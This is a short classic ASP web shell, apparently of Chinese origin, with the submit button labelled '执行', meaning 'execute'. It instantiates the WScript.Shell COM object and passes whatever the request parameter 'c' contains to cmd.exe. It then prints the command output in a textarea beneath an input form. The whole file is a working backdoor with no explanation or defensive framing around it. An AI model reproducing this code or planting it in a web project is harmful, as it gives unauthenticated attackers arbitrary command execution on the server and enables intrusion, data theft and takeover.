<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<%if err then%>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%
end if
response.write("<textarea readonly cols=80 rows=20>")
On Error Resume Next
response.write oScriptlhn.exec("cmd.exe /c" & request("c")).stdout.readall
response.write("</textarea>")
response.write("<form method='post'>")
response.write("<input type=text name='c' size=60><br>")
response.write("<input type=submit value='执行'></form>")
%> 